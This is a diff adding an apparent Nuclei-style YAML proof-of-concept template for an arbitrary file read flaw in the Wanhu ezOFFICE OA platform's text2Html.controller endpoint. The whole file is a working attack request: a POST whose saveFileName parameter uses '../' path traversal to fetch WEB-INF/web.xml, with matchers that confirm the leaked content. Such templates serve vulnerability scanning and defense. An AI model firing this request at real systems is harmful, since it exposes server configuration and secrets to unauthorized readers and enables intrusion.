@@ -1,0 +1,35 @@
+id: poc-yaml-whir-oa-text2html-anyfile-read
+info:
+  name: 万户OA text2Html 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    万户ezOFFICE协同管理平台存在的任意文件读取漏洞，通过特定路径和请求可以读取敏感文件。
+
+http:
+  - method: POST
+    path:
+      - "/defaultroot/convertFile/text2Html.controller"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      saveFileName=123456/../../../../WEB-INF/web.xml&moduleName=html
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "jsp-config"
+        part: body
+      - type: word
+        words:
+          - "servlet-name"
+        part: body
+      - type: word
+        words:
+          - "java.sun.com"
+        part: body
